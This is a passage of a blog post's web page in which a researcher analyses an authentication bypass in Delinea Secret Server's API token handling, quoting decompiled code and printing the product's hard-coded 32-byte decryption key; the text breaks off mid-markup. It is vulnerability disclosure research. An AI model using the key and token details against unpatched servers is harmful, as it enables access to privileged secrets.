0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div><input role="combobox" aria-controls="searchResults" aria-expanded="false" aria-label="search" data-testid="headerSearchInput" tabindex="0" class="ay be bf bg z bh bi bj bk bl" placeholder="Search" value=""/></div></div></div><div class="h k w fg fh"><div class="fi ab"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerWriteButton" href="https://medium.com/m/signin?operation=register&amp;redirect=https%3A%2F%2Fmedium.com%2Fnew-story&amp;source=---top_nav_layout_nav-----------------------new_post_topnav-----------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Write"><path fill="currentColor" d="M14 4a.5.5 0 0 0 0-1zm7 6a.5.5 0 0 0-1 0zm-7-7H4v1h10zM3 4v16h1V4zm1 17h16v-1H4zm17-1V10h-1v10zm-1 1a1 1 0 0 0 1-1h-1zM3 20a1 1 0 0 0 1 1v-1zM4 3a1 1 0 0 0-1 1h1z"></path><path stroke="currentColor" d="m17.5 4.5-8.458 8.458a.25.25 0 0 0-.06.098l-.824 2.47a.25.25 0 0 0 .316.316l2.47-.823a.25.25 0 0 0 .098-.06L19.5 6.5m-2-2 2.323-2.323a.25.25 0 0 1 .354 0l1.646 1.646a.25.25 0 0 1 0 .354L19.5 6.5m-2-2 2 2"></path></svg><div class="dt l">Write</div></div></a></span></div></div><div class="k j i d"><div class="fi ab"><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSearchButton" href="https://medium.com/search?source=---top_nav_layout_nav----------------------------------" rel="noopener follow"><div class="bf b bg z du fj fk ab q fl fm"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24" aria-label="Search"><path fill="currentColor" fill-rule="evenodd" d="M4.092 11.06a6.95 6.95 0 1 1 13.9 0 6.95 6.95 0 0 1-13.9 0m6.95-8.05a8.05 8.05 0 1 0 5.13 14.26l3.75 3.75a.56.56 0 1 0 .79-.79l-3.73-3.73A8.05 8.05 0 0 0 11.042 3z" clip-rule="evenodd"></path></svg></div></a></div></div><div class="fi h k j"><div class="ab q"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><button class="bf b dx dy eh dz ea ei eb ec ej ek ee el em eg eo ep eq er es et eu ev ew ex ey ez fa fb fc fd bm fe ff" data-testid="headerSignUpButton">Sign up</button></span></p><div class="ax l"><p class="bf b dx dy dz ea eb ec ed ee ef eg du"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerSignInButton" href="https://medium.com/m/signin?operation=login&amp;redirect=https%3A%2F%2Fstraightblast.medium.com%2Fall-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3&amp;source=post_page---top_nav_layout_nav-----------------------global_nav-----------" rel="noopener follow">Sign in</a></span></p></div></div></div><div class="l" aria-hidden="false"><button class="ay fn am ab q ao fo fp fq" aria-label="user options menu" data-testid="headerUserIcon"><div class="l fj"><img alt="" class="l fd by bz ca cx" src="https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png" width="32" height="32" loading="lazy" role="presentation"/><div class="fr by l bz ca fs n ay ft"></div></div></button></div></div></div><div class="l"><div class="fu fv fw fx fy l"><div class="ab cb"><div class="ci bh fz ga gb gc"></div></div><article><div class="l"><div class="l"><span class="l"></span><section><div><div class="fs gi gj gk gl gm"></div><div class="gn go gp gq gr"><div class="ab cb"><div class="ci bh fz ga gb gc"><div><h1 id="8563" class="pw-post-title gs gt gu bf gv gw gx gy gz ha hb hc hd he hf hg hh hi hj hk hl hm hn ho hp hq hr hs ht hu bk" data-testid="storyTitle">“All Your Secrets Are Belong To Us” — A Delinea Secret Server AuthN/AuthZ Bypass</h1><div><div class="speechify-ignore ab cp"><div class="speechify-ignore bh l"><div class="hv hw hx hy hz ab"><div><div class="ab ia"><div><div class="bm" aria-hidden="false"><a rel="noopener follow" href="/?source=post_page---byline--adc26c800ad3--------------------------------"><div class="l ib ic by id ie"><div class="l fj"><img alt="Johnny Yu (@straight_blast)" class="l fd by dd de cx" src="https://miro.medium.com/v2/resize:fill:88:88/2*pGIaZHTZBFR36xUvnclH5A.jpeg" width="44" height="44" loading="lazy" data-testid="authorPhoto"/><div class="if by l dd de fs n ig ft"></div></div></div></a></div></div></div></div><div class="bn bh l"><div class="ab"><div style="flex:1"><span class="bf b bg z bk"><div class="ih ab q"><div class="ab q ii"><div class="ab q"><div><div class="bm" aria-hidden="false"><p class="bf b ij ik bk"><a class="af ag ah ai aj ak al am an ao ap aq ar il" data-testid="authorName" rel="noopener follow" href="/?source=post_page---byline--adc26c800ad3--------------------------------">Johnny Yu (@straight_blast)</a></p></div></div></div><span class="im in" aria-hidden="true"><span class="bf b bg z du">·</span></span><p class="bf b ij ik du"><span><a class="io ip ah ai aj ak al am an ao ap aq ar ex iq ir" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F4bd9d210b6d1&amp;operation=register&amp;redirect=https%3A%2F%2Fstraightblast.medium.com%2Fall-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3&amp;user=Johnny+Yu+%28%40straight_blast%29&amp;userId=4bd9d210b6d1&amp;source=post_page-4bd9d210b6d1--byline--adc26c800ad3---------------------post_header-----------" rel="noopener follow">Follow</a></span></p></div></div></span></div></div><div class="l is"><span class="bf b bg z du"><div class="ab cn it iu iv"><span class="bf b bg z du"><div class="ab ae"><span data-testid="storyReadTime">7 min read</span><div class="iw ix l" aria-hidden="true"><span class="l" aria-hidden="true"><span class="bf b bg z du">·</span></span></div><span data-testid="storyPublishDate">Apr 10, 2024</span></div></span></div></span></div></div></div><div class="ab cp iy iz ja jb jc jd je jf jg jh ji jj jk jl jm jn"><div class="h k w fg fh q"><div class="kd l"><div class="ab q ke kf"><div class="pw-multi-vote-icon fj kg kh ki kj"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerClapButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fvote%2Fp%2Fadc26c800ad3&amp;operation=register&amp;redirect=https%3A%2F%2Fstraightblast.medium.com%2Fall-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3&amp;user=Johnny+Yu+%28%40straight_blast%29&amp;userId=4bd9d210b6d1&amp;source=---header_actions--adc26c800ad3---------------------clap_footer-----------" rel="noopener follow"><div><div class="bm" aria-hidden="false"><div class="kk ao kl km kn ko am kp kq kr kj"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" aria-label="clap"><path fill-rule="evenodd" d="M11.37.828 12 3.282l.63-2.454zM13.916 3.953l1.523-2.112-1.184-.39zM8.589 1.84l1.522 2.112-.337-2.501zM18.523 18.92c-.86.86-1.75 1.246-2.62 1.33a6 6 0 0 0 .407-.372c2.388-2.389 2.86-4.951 1.399-7.623l-.912-1.603-.79-1.672c-.26-.56-.194-.98.203-1.288a.7.7 0 0 1 .546-.132c.283.046.546.231.728.5l2.363 4.157c.976 1.624 1.141 4.237-1.324 6.702m-10.999-.438L3.37 14.328a.828.828 0 0 1 .585-1.408.83.83 0 0 1 .585.242l2.158 2.157a.365.365 0 0 0 .516-.516l-2.157-2.158-1.449-1.449a.826.826 0 0 1 1.167-1.17l3.438 3.44a.363.363 0 0 0 .516 0 .364.364 0 0 0 0-.516L5.293 9.513l-.97-.97a.826.826 0 0 1 0-1.166.84.84 0 0 1 1.167 0l.97.968 3.437 3.436a.36.36 0 0 0 .517 0 .366.366 0 0 0 0-.516L6.977 7.83a.82.82 0 0 1-.241-.584.82.82 0 0 1 .824-.826c.219 0 .43.087.584.242l5.787 5.787a.366.366 0 0 0 .587-.415l-1.117-2.363c-.26-.56-.194-.98.204-1.289a.7.7 0 0 1 .546-.132c.283.046.545.232.727.501l2.193 3.86c1.302 2.38.883 4.59-1.277 6.75-1.156 1.156-2.602 1.627-4.19 1.367-1.418-.236-2.866-1.033-4.079-2.246M10.75 5.971l2.12 2.12c-.41.502-.465 1.17-.128 1.89l.22.465-3.523-3.523a.8.8 0 0 1-.097-.368c0-.22.086-.428.241-.584a.847.847 0 0 1 1.167 0m7.355 1.705c-.31-.461-.746-.758-1.23-.837a1.44 1.44 0 0 0-1.11.275c-.312.24-.505.543-.59.881a1.74 1.74 0 0 0-.906-.465 1.47 1.47 0 0 0-.82.106l-2.182-2.182a1.56 1.56 0 0 0-2.2 0 1.54 1.54 0 0 0-.396.701 1.56 1.56 0 0 0-2.21-.01 1.55 1.55 0 0 0-.416.753c-.624-.624-1.649-.624-2.237-.037a1.557 1.557 0 0 0 0 2.2c-.239.1-.501.238-.715.453a1.56 1.56 0 0 0 0 2.2l.516.515a1.556 1.556 0 0 0-.753 2.615L7.01 19c1.32 1.319 2.909 2.189 4.475 2.449q.482.08.971.08c.85 0 1.653-.198 2.393-.579.231.033.46.054.686.054 1.266 0 2.457-.52 3.505-1.567 2.763-2.763 2.552-5.734 1.439-7.586z" clip-rule="evenodd"></path></svg></div></div></div></a></span></div><div class="pw-multi-vote-count l ks kt ku kv kw kx ky"><p class="bf b dv z du"><span class="kz">--</span></p></div></div></div><div><div class="bm" aria-hidden="false"><button class="ao kk la lb ab q fk lc ld" aria-label="responses"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" class="le"><path d="M18.006 16.803c1.533-1.456 2.234-3.325 2.234-5.321C20.24 7.357 16.709 4 12.191 4S4 7.357 4 11.482c0 4.126 3.674 7.482 8.191 7.482.817 0 1.622-.111 2.393-.327.231.2.48.391.744.559 1.06.693 2.203 1.044 3.399 1.044.224-.008.4-.112.486-.287a.49.49 0 0 0-.042-.518c-.495-.67-.845-1.364-1.04-2.057a4 4 0 0 1-.125-.598zm-3.122 1.055-.067-.223-.315.096a8 8 0 0 1-2.311.338c-4.023 0-7.292-2.955-7.292-6.587 0-3.633 3.269-6.588 7.292-6.588 4.014 0 7.112 2.958 7.112 6.593 0 1.794-.608 3.469-2.027 4.72l-.195.168v.255c0 .056 0 .151.016.295.025.231.081.478.154.733.154.558.398 1.117.722 1.659a5.3 5.3 0 0 1-2.165-.845c-.276-.176-.714-.383-.941-.59z"></path></svg></button></div></div></div><div class="ab q jo jp jq jr js jt ju jv jw jx jy jz ka kb kc"><div class="lf k j i d"></div><div class="h k"><div><div class="bm" aria-hidden="false"><span><a class="af ag ah ai aj ak al am an ao ap aq ar as at" data-testid="headerBookmarkButton" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Fadc26c800ad3&amp;operation=register&amp;redirect=https%3A%2F%2Fstraightblast.medium.com%2Fall-your-secrets-are-belong-to-us-a-delinea-secret-server-authn-authz-bypass-adc26c800ad3&amp;source=---header_actions--adc26c800ad3---------------------bookmark_footer-----------" rel="noopener follow"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="du lg" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></a></span></div></div></div><div class="fd lh cn"><div class="l ae"><div class="ab cb"><div class="li lj lk ll lm ln ci bh"><div class="ab"><div class="bm bh" aria-hidden="false"><div><div class="bm" aria-hidden="false"><button aria-label="Listen" data-testid="audioPlayButton" class="af fk ah ai aj ak al lo an ao ap ex lp lq ld lr ls lt lu lv s lw lx ly lz ma mb mc u md me mf"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M3 12a9 9 0 1 1 18 0 9 9 0 0 1-18 0m9-10C6.477 2 2 6.477 2 12s4.477 10 10 10 10-4.477 10-10S17.523 2 12 2m3.376 10.416-4.599 3.066a.5.5 0 0 1-.777-.416V8.934a.5.5 0 0 1 .777-.416l4.599 3.066a.5.5 0 0 1 0 .832" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Listen</p></div></button></div></div></div></div></div></div></div></div><div class="bm" aria-hidden="false" aria-describedby="postFooterSocialMenu" aria-labelledby="postFooterSocialMenu"><div><div class="bm" aria-hidden="false"><button aria-controls="postFooterSocialMenu" aria-expanded="false" aria-label="Share Post" data-testid="headerSocialShareButton" class="af fk ah ai aj ak al lo an ao ap ex lp lq ld lr ls lt lu lv s lw lx ly lz ma mb mc u md me mf"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" fill="none" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M15.218 4.931a.4.4 0 0 1-.118.132l.012.006a.45.45 0 0 1-.292.074.5.5 0 0 1-.3-.13l-2.02-2.02v7.07c0 .28-.23.5-.5.5s-.5-.22-.5-.5v-7.04l-2 2a.45.45 0 0 1-.57.04h-.02a.4.4 0 0 1-.16-.3.4.4 0 0 1 .1-.32l2.8-2.8a.5.5 0 0 1 .7 0l2.8 2.79a.42.42 0 0 1 .068.498m-.106.138.008.004v-.01zM16 7.063h1.5a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-11c-1.1 0-2-.9-2-2v-10a2 2 0 0 1 2-2H8a.5.5 0 0 1 .35.15.5.5 0 0 1 .15.35.5.5 0 0 1-.15.35.5.5 0 0 1-.35.15H6.4c-.5 0-.9.4-.9.9v10.2a.9.9 0 0 0 .9.9h11.2c.5 0 .9-.4.9-.9v-10.2c0-.5-.4-.9-.9-.9H16a.5.5 0 0 1 0-1" clip-rule="evenodd"></path></svg><div class="j i d"><p class="bf b bg z du">Share</p></div></button></div></div></div></div></div></div></div></div></div><figure class="mj mk ml mm mn mo mg mh paragraph-image"><div class="mg mh mi"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*MM46_6UlXce73BkyxMhfQA.jpeg 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*MM46_6UlXce73BkyxMhfQA.jpeg 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*MM46_6UlXce73BkyxMhfQA.jpeg 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*MM46_6UlXce73BkyxMhfQA.jpeg 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*MM46_6UlXce73BkyxMhfQA.jpeg 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*MM46_6UlXce73BkyxMhfQA.jpeg 1100w, https://miro.medium.com/v2/resize:fit:1282/format:webp/1*MM46_6UlXce73BkyxMhfQA.jpeg 1282w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 641px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*MM46_6UlXce73BkyxMhfQA.jpeg 640w, https://miro.medium.com/v2/resize:fit:720/1*MM46_6UlXce73BkyxMhfQA.jpeg 720w, https://miro.medium.com/v2/resize:fit:750/1*MM46_6UlXce73BkyxMhfQA.jpeg 750w, https://miro.medium.com/v2/resize:fit:786/1*MM46_6UlXce73BkyxMhfQA.jpeg 786w, https://miro.medium.com/v2/resize:fit:828/1*MM46_6UlXce73BkyxMhfQA.jpeg 828w, https://miro.medium.com/v2/resize:fit:1100/1*MM46_6UlXce73BkyxMhfQA.jpeg 1100w, https://miro.medium.com/v2/resize:fit:1282/1*MM46_6UlXce73BkyxMhfQA.jpeg 1282w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 641px"/><img alt="" class="bh ln mp c" width="641" height="389" loading="eager" role="presentation"/></picture></div></figure><p id="de6c" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk"><strong class="ms gv">Update:</strong></p><p id="9a89" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">04/30/2024 — MITRE assigned <a class="af no" href="https://nvd.nist.gov/vuln/detail/CVE-2024-33891" rel="noopener ugc nofollow" target="_blank">CVE-2024–33891</a></p><p id="8235" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">04/13/2024 — The patch 11.7.1 for Delinea Secret Server is available — <a class="af no" href="https://docs.delinea.com/online-help/secret-server/release-notes/ss-rn-11-7-000001.htm" rel="noopener ugc nofollow" target="_blank">https://docs.delinea.com/online-help/secret-server/release-notes/ss-rn-11-7-000001.htm</a></p><p id="bb6c" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —</p><p id="93a9" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk"><a class="af no" href="https://docs.delinea.com/online-help/secret-server/start.htm" rel="noopener ugc nofollow" target="_blank">Delinea Secret Server</a> is a privileged access management (PAM) solution that helps organizations secure, manage, and monitor privileged accounts and access across their IT infrastructure.</p><p id="866c" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">Accessing the application through the web UI requires standard username and password authentication. Additionally, it supports supplementary security measures like 2FA. Moreover, the application provides a set of web services accessible via an API token.</p><p id="9746" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">As part of my personal security research, I downloaded the <a class="af no" href="https://support.delinea.com/s/download-onprem" rel="noopener ugc nofollow" target="_blank">Delinea Secret Server On-Permises</a> to hunt for vulnerabilities. The product’s version at the time I downloaded it was <strong class="ms gv">16.000004</strong>. After installing the product, I looked into its directory and noted it was an ASP.NET application. I immediately review the <strong class="ms gv">web.config</strong> file as it serves as a roadmap to where potential attack surface could be at. I was looking for pages and resources that do not require AuthN/AuthZ. I found a webservice endpoint that did not sit behind a login page,</p><ul class=""><li id="2a19" class="mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn np nq nr bk">SecretServer/webservices/SSWebService.asmx</li></ul><figure class="nt nu nv nw nx mo mg mh paragraph-image"><div role="button" tabindex="0" class="ny nz fj oa bh ob"><div class="mg mh ns"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*yA19vy-97SUmA-DrklwJow.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*yA19vy-97SUmA-DrklwJow.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*yA19vy-97SUmA-DrklwJow.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*yA19vy-97SUmA-DrklwJow.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*yA19vy-97SUmA-DrklwJow.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*yA19vy-97SUmA-DrklwJow.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*yA19vy-97SUmA-DrklwJow.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"/><source data-testid="og" srcSet="https://miro.medium.com/v2/resize:fit:640/1*yA19vy-97SUmA-DrklwJow.png 640w, https://miro.medium.com/v2/resize:fit:720/1*yA19vy-97SUmA-DrklwJow.png 720w, https://miro.medium.com/v2/resize:fit:750/1*yA19vy-97SUmA-DrklwJow.png 750w, https://miro.medium.com/v2/resize:fit:786/1*yA19vy-97SUmA-DrklwJow.png 786w, https://miro.medium.com/v2/resize:fit:828/1*yA19vy-97SUmA-DrklwJow.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*yA19vy-97SUmA-DrklwJow.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*yA19vy-97SUmA-DrklwJow.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"/><img alt="" class="bh ln mp c" width="700" height="468" loading="lazy" role="presentation"/></picture></div></div></figure><p id="5d21" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">and I explored the APIs to evaluate their functionalities.</p><p id="fd54" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">Unfortunately, I could not exercise the APIs as they require an API token.</p><p id="a0ba" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">My initial thought was it would be a waste of effort to audit the API token implementation, as I felt such critical component would’ve went through rigorous security review. I took a leap of faith and dived into the decompiled code, which led me to astonishing discoveries.</p><p id="c665" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">For all web service requests, the API token is checked for validity via <strong class="ms gv">Thycotic.ihawu.Business.Authentication</strong> NS -&gt; <strong class="ms gv">ValidTokenProvider</strong> class -&gt; <strong class="ms gv">IsValidToken</strong> function from <strong class="ms gv">Thycotic.ihawu.Business.dll</strong></p><pre class="nt nu nv nw nx oc od oe bp of bb bk"><span id="3158" class="og oh gu od b bg oi oj l ok ol">... snipped ...<br/> authenticationTicket = this._oAuthAuthOptions.AccessTokenFormat.Unprotect(encryptedToken);<br/> num = (short)883621889;<br/> num2 = (int)((IntPtr)num);<br/> continue;<br/>... snipped ...</span></pre><p id="1418" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">The <strong class="ms gv">IsValidToken</strong> function will first deserialize the API token by calling the <strong class="ms gv">Thycotic.Identity.Formatters</strong> NS -&gt; <strong class="ms gv">SecureTokenFormatter</strong> class -&gt; <strong class="ms gv">Unprotect</strong> function from <strong class="ms gv">Thycotic.Identity.dll.</strong> The deserialization comprise of the following steps:</p><ol class=""><li id="3e11" class="mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn om nq nr bk">Base64 decode incoming string (API token)</li><li id="ff21" class="mq mr gu ms b mt on mv mw mx oo mz na nb op nd ne nf oq nh ni nj or nl nm nn om nq nr bk">Decrypt the decoded string (API token)</li><li id="83bb" class="mq mr gu ms b mt on mv mw mx oo mz na nb op nd ne nf oq nh ni nj or nl nm nn om nq nr bk">Deserialize the decrypted content into a <strong class="ms gv">Microsoft.Owin.Security.AuthenticationTicket</strong> object</li></ol><pre class="nt nu nv nw nx oc od oe bp of bb bk"><span id="990a" class="og oh gu od b bg oi oj l ok ol">public AuthenticationTicket Unprotect(string text)<br/>  {<br/>   byte[] protectedData = this._encoder.Decode(text);<br/>   byte[] data = this._protector.Unprotect(protectedData);<br/>   return this._serializer.Deserialize(data);<br/>  }</span></pre><p id="66e7" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">The first discovery resides in the <strong class="ms gv">Unprotect</strong> function, where it decrypts the API token with a hard-coded key.</p><p id="debb" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">The <strong class="ms gv">Unprotect</strong> function is located in <strong class="ms gv">Thycotic.Identity.dll </strong>-&gt;<strong class="ms gv"> Thycotic.Identity.Protectors </strong>NS -&gt;<strong class="ms gv"> ThycoticDataProtector</strong> class.</p><pre class="nt nu nv nw nx oc od oe bp of bb bk"><span id="7889" class="og oh gu od b bg oi oj l ok ol">public byte[] Unprotect(byte[] protectedData)<br/>{<br/>byte[] key = this._keyProvider.GetKey();<br/>if (key == null)<br/>{<br/>throw new SecurityException(&quot;Invalid Key&quot;);<br/>}<br/>byte[] first = protectedData.Take(2).ToArray&lt;byte&gt;();<br/>... snipped ...</span></pre><p id="f227" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">The call to<strong class="ms gv"> _keyProvider.GetKey()</strong> leads to the following:</p><pre class="nt nu nv nw nx oc od oe bp of bb bk"><span id="9a95" class="og oh gu od b bg oi oj l ok ol">namespace Thycotic.Identity.Providers<br/>{<br/>// Token: 0x02000009 RID: 9<br/>public class KeyProvider : IKeyProvider<br/>{<br/>// Token: 0x06000017 RID: 23 RVA: 0x000021CA File Offset: 0x000003CA<br/>public byte[] GetKey()<br/>{<br/>return new byte[]<br/>{<br/>94,<br/>236,<br/>230,<br/>169,<br/>211,<br/>147,<br/>133,<br/>245,<br/>121,<br/>91,<br/>206,<br/>177,<br/>186,<br/>5,<br/>69,<br/>44,<br/>76,<br/>117,<br/>133,<br/>146,<br/>11,<br/>237,<br/>91,<br/>37,<br/>252,<br/>151,<br/>171,<br/>17,<br/>83,<br/>67,<br/>193,<br/>141<br/>};<br/>}<br/>}<br/>}</span></pre><p id="b5de" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">The uncovering of hard-coded key served as a motivator to investigate the rest of the API token checking mechanism.</p><p id="165b" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">When the API token is deserialized into a <strong class="ms gv">Microsoft.Owin.Security.AuthenticationTicket</strong> object, the next step in the <strong class="ms gv">IsValidToken</strong> function is to retrieve the user profile from it.</p><pre class="nt nu nv nw nx oc od oe bp of bb bk"><span id="058f" class="og oh gu od b bg oi oj l ok ol">... snipped ...<br/>IL_291:<br/>user = this._owinClaimHelper.GetUser(authenticationTicket.Identity.Claims);<br/>num = (short)235012100;<br/>num2 = (int)((IntPtr)num);<br/>... snipped ...</span></pre><p id="98ea" class="pw-post-body-paragraph mq mr gu ms b mt mu mv mw mx my mz na nb nc nd ne nf ng nh ni nj nk nl nm nn gn bk">The <strong class="ms gv">GetUser</strong> function is located in <strong class="ms gv">Thycotic.ihawu.Business.Authentication</strong> NS -&gt; <strong class="ms gv">OwinClaimHelper</strong> class under <strong class="ms gv">Thycotic.ihawu.Business.dll</strong>, and this logic retrieves the user profile from the <strong class="ms gv">nameidentifier</strong> property which holds an Integer string.</p><figure class="nt nu nv nw nx mo mg mh paragraph-image"><div role="button" tabindex="0" class="ny nz fj oa bh ob"><div class="mg mh os"><picture><source srcSet="https://miro.medium.com/v2/resize:fit:640/format:webp/1*0XqH9Xm6eCkQGBDDiWO9Ig.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*0XqH9Xm6eCkQGBDDiWO9Ig.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*0XqH9Xm6eCkQGBDDiWO9Ig.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*0XqH9Xm6eCkQGBDDiWO9Ig.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*0XqH9Xm6eCkQGBDDiWO9Ig.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*0XqH9Xm6eCkQGBDDiWO9Ig.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0XqH9Xm6eCkQGBDDiWO9Ig.png 